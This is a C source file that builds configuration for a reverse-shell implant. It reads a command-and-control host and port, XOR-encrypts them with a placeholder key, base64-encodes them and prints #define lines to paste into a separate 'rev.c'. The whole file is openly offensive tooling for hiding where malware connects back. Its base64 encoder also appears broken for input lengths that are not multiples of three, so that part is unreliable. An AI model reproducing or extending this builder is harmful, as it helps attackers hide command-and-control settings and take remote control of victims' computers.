#include <stdio.h>
#include <string.h>

#define KEY_LEN 32

static const unsigned char KEY[KEY_LEN] = {
    'X','X','X','X','X','X','X','X','X','X','X','X','X','X','X','X',
    'X','X','X','X','X','X','X','X','X','X','X','X','X','X','X','X'
};

static const char BASE64_CHARS[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

void base64_encode(const unsigned char* in, int in_len, char* out) {
    int in_idx = 0, out_idx = 0;

    while (in_idx < in_len) {
        int block = 0;
        int bits = 0;
        out[out_idx] = 0;

        for (int i = 0; i < 3 && in_idx < in_len; ++i) {
            block = (block << 8) | in[in_idx++];
            bits += 8;
        }

        while (bits > 0) {
            int index = (block >> (bits - 6)) & 0x3F;
            out[out_idx++] = BASE64_CHARS[index];
            bits -= 6;
        }
    }

    // Padding
    int pad = (3 - (in_len % 3)) % 3;
    for (int i = 0; i < pad; ++i) {
        out[out_idx++] = '=';
    }
    out[out_idx] = '\0';
}

void xor_encrypt(
    const unsigned char* in, int in_len,
    unsigned char* out,
    const unsigned char* key, int key_len
) {
    for (int i = 0; i < in_len; ++i) {
        out[i] = in[i] ^ key[i % key_len];
    }
}

int main() {
    char HOST[64];
    char PORT[16];

    printf("Enter C2 HOST (e.g., 192.168.1.10 or domain): ");
    fflush(stdout);
    if (!fgets(HOST, sizeof(HOST), stdin)) return 1;
    HOST[strcspn(HOST, "\n")] = '\0';

    printf("Enter C2 PORT (e.g., 4444): ");
    fflush(stdout);
    if (!fgets(PORT, sizeof(PORT), stdin)) return 1;
    PORT[strcspn(PORT, "\n")] = '\0';

    int host_len = strlen(HOST);
    int port_len = strlen(PORT);

    unsigned char enc_host[64] = {0};
    unsigned char enc_port[16] = {0};

    xor_encrypt((const unsigned char*)HOST, host_len, enc_host, KEY, KEY_LEN);
    xor_encrypt((const unsigned char*)PORT, port_len, enc_port, KEY, KEY_LEN);

    char b64_host[256], b64_port[256];
    base64_encode(enc_host, host_len, b64_host);
    base64_encode(enc_port, port_len, b64_port);

    printf("\n/* Paste into rev.c */\n\n");
    printf("#define B64_HOST \"%s\"\n", b64_host);
    printf("#define B64_PORT \"%s\"\n\n", b64_port);

    return 0;
}
